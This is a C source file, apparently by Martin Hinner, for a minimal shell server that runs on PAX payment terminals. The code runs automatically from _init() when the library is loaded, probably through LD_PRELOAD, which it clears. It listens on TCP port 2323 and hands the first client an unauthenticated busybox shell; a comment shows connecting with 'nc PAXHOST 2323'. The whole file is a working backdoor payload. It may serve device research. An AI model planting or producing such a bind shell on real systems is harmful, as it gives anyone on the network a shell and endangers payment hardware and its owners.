/*
  Minimalistic tcp server for PAX
  Martin Hinner

 (connect via nc PAXHOST 2323)
*/
#include <stdio.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <stdlib.h>
#include <unistd.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <string.h>

const char header[] =
    "This is insecure PAX tcp shell server, /data/app/MAINAPP/busybox must be a copy of busybox.\nThe shell server will terminate when this session closes.\n\n";

int _init()
{

  int socket_desc, client_sock, c;
  struct sockaddr_in server, client;

  unsetenv("LD_PRELOAD");

  // Create socket
  socket_desc = socket(AF_INET, SOCK_STREAM, 0);
  if (socket_desc == -1)
  {
    exit(1);
  }

  // Prepare the sockaddr_in structure
  server.sin_family = AF_INET;
  server.sin_addr.s_addr = INADDR_ANY;
  server.sin_port = htons(2323);

  // set SO_REUSEADDR on a socket to true (1):
  int optval = 1;
  setsockopt(socket_desc, SOL_SOCKET, SO_REUSEADDR, &optval, sizeof optval);

  // Bind
  if (bind(socket_desc, (struct sockaddr *)&server, sizeof(server)) < 0)
  {
    // print the error message
    perror("bind failed. Error");
    return 1;
  }

  // Listen
  listen(socket_desc, 3);

  // Accept and incoming connection
  c = sizeof(struct sockaddr_in);

  // accept connection from an incoming client
  client_sock =
      accept(socket_desc, (struct sockaddr *)&client, (socklen_t *)&c);
  if (client_sock < 0)
  {
    exit(1);
  }

  write(client_sock, header, strlen(header));
  dup2(client_sock, 0);
  dup2(client_sock, 1);
  dup2(client_sock, 2);

  char *const path = "/data/app/MAINAPP/bin/busybox";
  char *const argv[] = {path, "sh", "-s", NULL};
  char *const envp[] = {"PATH=/sbin:/usr/sbin:/bin:/usr/bin:/data/app/MAINAPP/bin:/data/app/MAINAPP", NULL};
  execve(path, argv, envp);

  return 0;
}
